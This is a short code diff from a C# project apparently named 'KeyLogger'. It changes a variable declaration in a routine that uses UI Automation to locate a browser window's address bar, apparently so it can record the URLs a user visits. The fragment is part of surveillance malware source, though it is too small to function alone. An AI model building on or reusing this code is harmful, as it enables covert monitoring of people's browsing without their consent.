@@ -97,7 +97,7 @@ namespace key.KeyLogger
                                 continue;
                             }
                             AutomationElement root = AutomationElement.FromHandle(proc.MainWindowHandle);
-                            var SearchBar = root.FindFirst(TreeScope.Descendants, new PropertyCondition(AutomationElement.NameProperty, "Address and search bar"));
+                            AutomationElement SearchBar = root.FindFirst(TreeScope.Descendants, new PropertyCondition(AutomationElement.NameProperty, "Address and search bar"));
                             Dictionary<string, string> dictionary = new Dictionary<string, string>();
                             if (SearchBar != null)
                             {
